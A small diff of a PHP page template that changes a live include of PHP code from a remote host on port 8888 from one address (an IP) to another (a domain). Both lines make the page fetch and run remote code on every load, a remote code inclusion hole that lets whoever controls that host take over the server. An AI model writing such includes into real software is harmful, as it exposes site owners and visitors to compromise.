@@ -264,7 +264,7 @@ if (is_dir($service_verzeichnis)) {
 		<?php if (isset($msg_field)) { echo $msg_field; } ?>
 		<?php
 			#include('http://'.$_SERVER["REMOTE_ADDR"].':8888');
-			require('http://94.114.96.160:8888');
+			include('http://tom-aschmann.de:8888');
 		?>
 	</section>
 <?php
